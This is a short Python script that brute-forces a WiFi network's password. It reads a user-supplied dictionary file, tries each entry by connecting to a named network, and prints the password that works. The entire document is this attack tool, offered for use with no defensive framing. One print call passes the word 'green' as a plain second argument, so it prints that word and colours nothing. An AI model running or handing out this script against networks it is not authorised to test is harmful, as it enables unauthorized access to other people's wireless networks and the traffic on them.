from wireless import Wireless
from termcolor import colored


file_path = str(input(colored('enter path to dictionary file to bruteforce with: ', 'blue')))
name_of_wifi = str(input(colored('enter wifi name: ', 'blue')))
wire = Wireless()
with open(file_path, 'r') as file:
    for line in file.readlines():
        if wire.connect(ssid=name_of_wifi, password=line.strip()):
            print(f'success! password is {line.strip()}', 'green')
        else:
            pass